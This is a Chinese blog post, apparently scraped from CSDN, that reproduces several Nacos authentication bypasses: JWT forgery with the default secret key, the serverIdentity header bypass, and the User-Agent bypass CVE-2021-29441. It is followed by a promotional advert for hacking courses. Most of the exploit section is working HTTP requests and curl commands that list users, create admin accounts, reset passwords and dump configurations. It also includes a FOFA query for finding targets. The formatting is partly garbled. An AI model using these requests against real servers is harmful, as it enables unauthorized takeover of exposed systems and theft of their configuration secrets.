
--- 
title:  Nacos漏洞总结复现 
tags: []
categories: [] 

---
#### Nacos漏洞总结复现

#### 一、Nacos默认key导致权限绕过登陆

##### 0x00 漏洞描述

Nacos中发现影响Nacos &lt;= 2.1.0的问题，Nacos用户使用默认JWT密钥导致未授权访问漏洞。 通过该漏洞，攻击者可以绕过用户名密码认证，直接登录Nacos用户

##### 0x01 漏洞影响

0.1.0 &lt;= Nacos &lt;= 2.2.0

##### 0x02 漏洞搜索

fofa：app=“NACOS”

##### 0x03 漏洞复现

在nacos中，token.secret.key值是固定死的，位置在conf下的application.properties中：

nacos.core.auth.plugin.nacos.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789

 1.获取token

利用该默认key可进行jwt构造，直接进入后台，构造方法： 在中：输入默认key：

SecretKey012345678901234567890123456789012345678901234567890123456789

然后再payload里面输入：

{<!-- -->

“sub”: “nacos”,

“exp”: 1678899909

}

在这里注意：1678899909这个值是unix时间戳，换算一下，要比你系统当前的时间更晚，比如当前的时间是2023年03月15日22:11:09，在这里面的时间戳时间是3月16号了：

注意：

以下是伪造JWT值绕过权限的测试结果

1、延长时间戳，POST 密码错误，用户名正确 ✅

2、延长时间戳，POST 密码错误，用户名错误 ✅

3、删除时间戳，POST 密码错误，用户名错误 ✅

复制上面得到的值，在burp里面选择登录之后构造：

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s

方框里面需要自行添加：

POST /nacos/v1/auth/users/login HTTP/1.1

Host: 10.211.55.5:8848

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0

Accept: application/json, text/plain, */*

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 33

Origin: http://10.211.55.5:8848

Connection: close

Referer: http://10.211.55.5:8848/nacos/index.html

Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s

username=crowsec&amp;password=crowsec

此时就得到了token信息：

HTTP/1.1 200

Vary: Origin

Vary: Access-Control-Request-Method

Vary: Access-Control-Request-Headers

Content-Security-Policy: script-src ‘self’

Set-Cookie: JSESSIONID=D90CF6E5B233685E4A39C1B1BDA9F185; Path=/nacos; HttpOnly

Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s

Content-Type: application/json

Date: Wed, 15 Mar 2023 14:13:22 GMT

Connection: close

Content-Length: 197

{“accessToken”:“eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s”,“tokenTtl”:18000,“globalAdmin”:true,“username”:“nacos”}

此时就得到了nacos的token信息。

2.利用获取token登录后台

如何登录呢，在这里需要用假账号登录之后，再修改返回包就行了，试试看： 先用假账号登录，用burp拦截：

这肯定进不去的，在这里修改返回包，右键看下这个：

然后Forward，这边返回的信息肯定是无效的：

在这里使用刚刚burp里面生成的返回包进行替换，全部复制过去：

再forward一次：

此时就已经进去了：

3.使用默认密钥生成的JWT查看当前用户名和密码

```
GET /nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s&amp;pageNo=1&amp;pageSize=9 HTTP/1.1

```

```
Host: {<!-- -->{Hostname}}

```

```
User-Agent: Mozilla/5.0

```

```
Accept-Encoding: gzip, deflate

```

```
Connection: close

```

```
If-Modified-Since: Wed, 15 Feb 2023 10:45:10 GMT

```

```
Upgrade-Insecure-Requests: 1

```

```
accessToken: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s

```

```
  


```

```
  


```

4.利用默认密钥，添加hellonacos用户密码为hellonacos，创建成功

POST /nacos/v1/auth/users HTTP/1.1

Host: {<!-- -->{Hostname}}

User-Agent: Mozilla/5.0

Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

If-Modified-Since: Wed, 15 Feb 2023 10:45:10 GMT

Content-Type: application/x-www-form-urlencoded

Content-Length: 39

username=hellonacos&amp;password=hellonacos

##### 二、Nacos默认配置未授权访问漏洞

http://10.10.84.207:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=accurate&amp;accessToken

http://your_ip:8848/nacos/v1/auth/users/?pageNo=1&amp;pageSize=9

<img src="https://img-blog.csdnimg.cn/img_convert/be7d09d834ef0edf02212dd92b36d8db.jpeg" alt="">

<img src="https://img-blog.csdnimg.cn/img_convert/559ba379d9643ee8878a9af169890a0c.jpeg" alt="">

##### 三、 Nacos2.2.0权限绕过

Header中添加serverIdentity: security能直接绕过身份验证查看用户列表

<img src="https://img-blog.csdnimg.cn/img_convert/9b24b341f42b0cff76ddcd5710cc99d5.jpeg" alt="">

如果没有或者不对应则返回403

<img src="https://img-blog.csdnimg.cn/img_convert/8d37530c263e05aa7d9111398160b752.jpeg" alt="">

##### 四、Nacos1.x.x版本User-Agent权限绕过((CVE-2021-29441)

##### 0x01 漏洞描述

在 1.4.1 及更早版本的 Nacos 中，当配置为使用身份验证 (Dnacos.core.auth.enabled=true) 时，会使用 AuthFilter servlet 过滤器来强制实施身份验证，从而跳过身份验证检查。此机制依赖于用户代理 HTTP 标头，因此很容易被欺骗。此问题可能允许任何用户在 Nacos 服务器上执行任何管理任务。

##### 0x02 环境搭建

docker run -d -p 8848:8848 hglight/cve-2021-29441

##### 0x03 漏洞影响

Nacos &lt;= 1.4.1

##### 0x04 漏洞复现

```

    
    
     
           
      
       
       ```
      
      

       
       1.修改User-Agent的值为Nacos-Server到请求包中,
       
       添
       
       加Header头后访问
       
       http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9
       
       可以看到返回值为200,且内容中是否包含
       
       pageItems
      
      

      
      

       
       

        
        GET /nacos/v1/auth/users/?pageNo=1&amp;pageSize=9 HTTP/1.1
[](https://blog.csdn.net/m0_64910183/article/details/130144800?spm=1001.2014.3001.5502)Host: 192.168.246.138:8848
[](https://blog.csdn.net/m0_64910183/article/details/130144800?spm=1001.2014.3001.5502)User-Agent: Nacos-Server  
       
       

       
       

        
        

         
         ![](https://img-blog.csdnimg.cn/img_convert/870c929ad4b75f75daa1722406a0d643.png)
        
        

       
       

      
      

      
      

       
       

        
        或者使用命令访问：
       
       

       
       

        
        读取用户密码：
       
       

       
       

        
        curl  
        
        'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;accessToken=' -H 
        
        'User-Agent: Nacos-Server'
       
       

      
      

      
      

       
       curl 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;
       
       search=blur' -H 'User-Agent: Nacos-Server'
       
         
curl 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;
       
       search=accurate' -H 'User-Agent: Nacos-Server'
      
      

      
      

       
       未授权添加用户
      
      

      
      

       
       curl -X POST 'http://127.0.0.1:8848/nacos/v1/auth/users?username=test1&amp;password=test1' -H 'User-Agent:Nacos-Server
      
      

      
      

       
       任意用户密码更改
      
      

      
      

       
       curl -X PUT 'http://127.0.0.1:8848/nacos/v1/auth/users?accessToken=' -H 'User-Agent:Nacos-Server' -d 'username=test1&amp;newPassword=test2'
      
      

      
      

       
       读取配置文件
      
      

      
      

       
       curl -X GET 'http://127.0.0.1:8848/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99’
      
      

      
      

       
       curl -X GET 'http://127.0.0.1:8848/nacos/v1/cs/configs?search=blur&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99’
      
      

      
      

       
       添加Header头后使用POST方式请求http://target:8848/nacos/v1/auth/users?username=vulhub&amp;password=vulhub添加一个新用户,账号密码都为vulhub
      
      

      
      

       
       POST 
       
       /nacos/v1/auth/users?username=hglight&amp;password=hglight 
       
       HTTP
       
       /
       
       1.1

       
       [](https://blog.csdn.net/m0_64910183/article/details/130144800?spm=1001.2014.3001.5502)
       
       Host
       
       : 
       
       192.168.246.138:8848

       
       [](https://blog.csdn.net/m0_64910183/article/details/130144800?spm=1001.2014.3001.5502)
       
       User-Agent
       
       : 
       
       Nacos-Server
      
      

      
      

       
       或者
      
      

      
      

       
       POST /nacos/v1/auth/users HTTP/1.1
      
      

      
      

       
       Host: 192.168.31.64:8848
      
      

      
      

       
       Cache-Control: max-age=0
      
      

      
      

       
       Upgrade-Insecure-Requests: 1
      
      

      
      

       
       User-Agent: Nacos-Server
      
      

      
      

       
       Accept-Encoding: gzip, deflate
      
      

      
      

       
       Accept-Language: zh-CN,zh;q=0.9
      
      

      
      

       
       Connection: close
      
      

      
      

       
       Content-Type: application/x-www-form-urlencoded
      
      

      
      

       
       Content-Length: 27
      
      

      
      

       
       username=hglight&amp;password=hglight
      
      

      
      

       
       

        
        ![](https://img-blog.csdnimg.cn/img_convert/78e5b89809ae9e233bf4518be4274adb.png)
       
       

       
         
      
      

      
      

       
       

        
        

再次查看用户列表，返回的用户列表数据中，多了一个我们通过绕过鉴权创建的新用户

        
        

         
         ```
[](https://blog.csdn.net/m0_64910183/article/details/130144800?spm=1001.2014.3001.5502)GET /nacos/v1/auth/users/?pageNo=1&amp;pageSize=9 HTTP/1.1
[](https://blog.csdn.net/m0_64910183/article/details/130144800?spm=1001.2014.3001.5502)Host: 192.168.246.138:8848
[](https://blog.csdn.net/m0_64910183/article/details/130144800?spm=1001.2014.3001.5502)User-Agent: Nacos-Server

```

```
     ```
      
      

       
       ![](https://img-blog.csdnimg.cn/img_convert/5e35faa54b702737b08d29d7902c1cf0.png)
      
      

      
      

       
       访问http://IP:8848/nacos使用新建用户登录，此时表示漏洞利用成功
      
      

      
      

       
       

        
        ![](https://img-blog.csdnimg.cn/img_convert/f999bbc518ff324c0bb6151a00114269.jpeg)
       
       

       
       

        
        

         
         ![](https://img-blog.csdnimg.cn/img_convert/b135b18512e02bb436aa6fd7d2be26c1.jpeg)

```

随着信息技术的快速发展和互联网的普及，IT行业 成为一个非常热门的领域，也是目前就业前景非常广阔的领域之一。

IT行业是一个非常庞大和多样化的行业，包括软件开发、网络安全、数据分析、云计算等等领域。因此，就业前景也是非常广泛和多样化的，不同的领域和职位都具有不同的就业前景和发展机会。

在软件开发领域，由于软件已经成为现代社会不可或缺的一部分，因此对软件开发人才的需求也越来越大。特别是在移动应用、大数据、人工智能等领域，软件开发人才的需求更是迅速增长。因此，软件开发人才的就业前景非常广阔，尤其是那些熟练掌握多种编程语言和技术的人才。

有幸看到一篇这样一组数据。

<img src="https://img-blog.csdnimg.cn/c3114b9c3bf947adb177b7aaf91e1be5.png" alt="">

<img src="https://img-blog.csdnimg.cn/img_convert/d5f06d6b9945fd6e8a5f92a0198e5446.png" alt="">

<img src="https://img-blog.csdnimg.cn/img_convert/9cf857398f52a97ff49d437ac5fe690a.png" alt="">

根据这些我不得总结，it行业确实人才紧缺，

##### **网络安全行业特点**

1、就业薪资非常高，涨薪快 2021年猎聘网发布网络安全行业就业薪资行业最高人均33.77万！

2、人才缺口大，就业机会多

2019年9月18日《中华人民共和国中央人民政府》官方网站发表：我国网络空间安全人才 需求140万人，而全国各大学校每年培养的人员不到1.5W人。猎聘网《2021年上半年网络安全报告》预测2027年网安人才需求300W，现在从事网络安全行业的从业人员只有10W人。

##### 行业发展空间大，岗位非常多

网络安全行业产业以来，随即新增加了几十个网络安全行业岗位︰网络安全专家、网络安全分析师、安全咨询师、网络安全工程师、安全架构师、安全运维工程师、渗透工程师、信息安全管理员、数据安全工程师、网络安全运营工程师、网络安全应急响应工程师、数据鉴定师、网络安全产品经理、网络安全服务工程师、网络安全培训师、网络安全审计员、威胁情报分析工程师、灾难恢复专业人员、实战攻防专业人员…

##### 职业增值潜力大

网络安全专业具有很强的技术特性，尤其是掌握工作中的核心网络架构、安全技术，在职业发展上具有不可替代的竞争优势。

随着个人能力的不断提升，所从事工作的职业价值也会随着自身经验的丰富以及项目运作的成熟，升值空间一路看涨，这也是为什么受大家欢迎的主要原因。

从某种程度来讲，在网络安全领域，跟医生职业一样，越老越吃香，因为技术愈加成熟，自然工作会受到重视，升职加薪则是水到渠成之事。

#### 如果你对网络安全入门感兴趣，那么你点击这里**👉**

**如果你对网络安全感兴趣，学习资源免费分享，保证100%免费！！！（嘿客入门教程）**

## 学习资料分享

当然，**只给予计划不给予学习资料的行为无异于耍流氓**，### 如果你对网络安全入门感兴趣，那么你点击这里**👉**

**如果你对网络安全感兴趣，学习资源免费分享，保证100%免费！！！（嘿客入门教程）**

**👉网安（嘿客）全套学习视频👈**

我们在看视频学习的时候，不能光动眼动脑不动手，比较科学的学习方法是在理解之后运用它们，这时候练手项目就很适合了。

#### 

#### <img src="https://img-blog.csdnimg.cn/img_convert/d1c617b78ee48eda7601e5b803e69276.png" alt="img">

#### **👉网安（嘿客红蓝对抗）所有方向的学习路线****👈**

对于从来没有接触过网络安全的同学，我们帮你准备了详细的学习成长路线图。可以说是最科学最系统的学习路线，大家跟着这个大的方向学习准没问题。

#### <img src="https://img-blog.csdnimg.cn/img_convert/de55dfd737dae0cf88e416d0454b17a8.png" alt="img">

#### 学习资料工具包

压箱底的好资料，全面地介绍网络安全的基础理论，包括逆向、八层网络防御、汇编语言、白帽子web安全、密码学、网络安全协议等，将基础理论和主流工具的应用实践紧密结合，有利于读者理解各种主流工具背后的实现机制。

<img src="https://img-blog.csdnimg.cn/9609a53465cf4253b492a5185896fa71.png" alt="在这里插入图片描述">

**面试题资料**

独家渠道收集京东、360、天融信等公司测试题！进大厂指日可待！ <img src="https://img-blog.csdnimg.cn/f5f267c281c543fb9cc9af53b9003a37.png" alt="在这里插入图片描述">

#### **👉<strong><strong>嘿客必备开发工具**</strong>👈</strong>

工欲善其事必先利其器。学习**嘿**客常用的开发软件都在这里了，给大家节省了很多时间。

#### 这份完整版的网络安全（**嘿**客）全套学习资料已经上传至CSDN官方，朋友们如果需要点击下方链接**也可扫描下方微信二v码获取网络工程师全套资料**【保证100%免费】

#### <img src="https://img-blog.csdnimg.cn/img_convert/16c400294b6fda8f01400f24f1f12b0c.png" alt="在这里插入图片描述">

#### 如果你对网络安全入门感兴趣，那么你点击这里**👉**
